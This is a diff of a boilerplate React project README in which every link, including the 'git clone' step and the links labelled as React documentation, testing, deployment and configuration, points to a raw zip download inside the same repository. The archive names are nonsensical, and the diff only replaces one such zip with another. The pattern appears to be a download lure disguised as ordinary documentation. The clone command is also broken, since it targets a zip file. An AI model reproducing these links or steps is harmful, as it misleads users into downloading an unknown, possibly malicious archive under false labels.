@@ -4,7 +4,7 @@
 
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip
+   git clone https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip
    ```
    // Clone the project repository to your local machine.
 
@@ -62,7 +62,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip) for more information.
+See the section about [running tests](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip) for more information.
 
 ### `npm run build`
 
@@ -72,7 +72,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip) for more information.
+See the section about [deployment](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip) for more information.
 
 ### `npm run eject`
 
@@ -86,30 +86,30 @@ You don't have to ever use `eject`. The curated feature set is suitable for smal
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip).
+You can learn more in the [Create React App documentation](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip).
 
-To learn React, check out the [React documentation](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip).
+To learn React, check out the [React documentation](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip)
+This section has moved here: [https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip)
+This section has moved here: [https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip)
+This section has moved here: [https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip)
+This section has moved here: [https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip)
 
 ### Deployment
 
-This section has moved here: [https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip)
+This section has moved here: [https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip](https://raw.githubusercontent.com/masombukablessing/Blessing-WebStore/main/src/redux/Store-Web-Blessing-stainproof.zip)
+This section has moved here: [https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip](https://github.com/masombukablessing/Blessing-WebStore/raw/refs/heads/main/public/Blessing_Web_Store_hemiscotosis.zip)
